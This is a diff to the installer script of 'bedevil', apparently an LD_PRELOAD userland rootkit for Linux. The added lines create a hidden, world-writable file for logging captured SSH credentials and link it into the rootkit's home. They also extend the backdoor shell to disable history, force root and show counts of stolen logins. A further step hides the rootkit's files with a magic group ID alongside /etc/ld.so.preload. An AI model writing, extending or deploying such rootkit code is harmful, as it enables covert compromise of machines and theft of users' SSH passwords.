@@ -2,10 +2,11 @@
 
 # default variables for certain settings.
 # these can/will be changed during setup.
-MGID=$RANDOM
-IDIR="/lib/bedevil.$RANDOM"
-BD_ENV="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
+[ -z $MGID ] && MGID=$RANDOM
+[ -z $IDIR ] && IDIR="/lib/bedevil.$RANDOM"
+[ -z $BD_ENV ] && BD_ENV="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
 [ -z $LDSO_PRELOAD ] && LDSO_PRELOAD="/etc/ld.so.preload"
+[ -z $SSH_LOGS ] && SSH_LOGS="/lib/bedevil.$RANDOM"
 
 BDVLC="bdvl.c"
 BDVLSO="`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n1`.so" # shared object to create
@@ -204,6 +205,7 @@ start_config_wizard()
         RAND_VALUE="`cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 8 | head -n1`"
         [[ "$var" == *"IDIR"* ]] && RAND_VALUE=$IDIR
         [[ "$var" == *"BD_ENV"* ]] && RAND_VALUE=$BD_ENV
+        [[ "$var" == *"SSH_LOGS"* ]] && RAND_VALUE=$SSH_LOGS
 
         read -p " [..] Variable input for ${var//\?} [$RAND_VALUE]: "
         if [ ! -z $REPLY ]; then
@@ -215,6 +217,7 @@ start_config_wizard()
             PSETTINGS+="\"`xenc $REPLY`\":$var "
             [[ "$var" == *"IDIR"* ]] && eval IDIR="$REPLY"
             [[ "$var" == *"BD_ENV"* ]] && eval BD_ENV="$REPLY"
+            [[ "$var" == *"SSH_LOGS"* ]] && eval SSH_LOGS="$REPLY"
         else
             if [[ "$var" == *"BD_PWD"* ]]; then
               PSETTINGS+="\"`xenc $(guserpwd $RAND_VALUE)`\":$var "
@@ -410,19 +413,24 @@ setup_home()
 unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND
 [ \$(id -u) != 0 ] && su root
 [ \$(id -u) != 0 ] && kill -9 \$\$
-[ -f etc/README ] && cat etc/README | less && rm etc/README
-clear
+[ -f ~/etc/README ] && cat ~/etc/README | less && rm etc/README
 
-[ -f .ascii ] && printf \"\\e[1m\\e[31m\`cat .ascii\`\\e[0m\\n\"
+clear
+[ -f ~/.ascii ] && printf \"\\e[1m\\e[31m\`cat ~/.ascii\`\\e[0m\\n\"
+
+export PATH=\"\$PATH:~/etc\"
 alias ls='ls --color=auto'
 alias ll='ls --color=auto -AlFhn'
 
-id
-[ ! -f ./auth_logs ] && touch auth_logs
-echo -e \"\\033[1mLogged accounts: \\033[1;31m\$(grep Username ~/auth_logs 2>/dev/null | wc -l)\\033[0m\""
+id; who
+[ ! -f ~/auth_logs ] && touch ~/auth_logs
+echo -e \"\\033[1mLogged accounts: \\033[1;31m\$(grep Username ~/auth_logs 2>/dev/null | wc -l)\\033[0m\"
+echo -e \"\\033[1mSSH logs: \\033[1;31m\$(cat ~/ssh_logs | wc -l)\\033[0m\""
     echo "$RBASHRC" > $LBASHRC
 
-    chown 0:$MGID $LDSO_PRELOAD $1 $1/* $1/.profile $1/.bashrc $1/.ascii
+    necho "Hiding rootkit files"
+    touch $SSH_LOGS && chmod 777 $SSH_LOGS && ln -s $SSH_LOGS $1/ssh_logs
+    chown 0:$MGID $LDSO_PRELOAD $SSH_LOGS $1 $1/* $1/.profile $1/.bashrc $1/.ascii
 }
 
 install_bdvl()
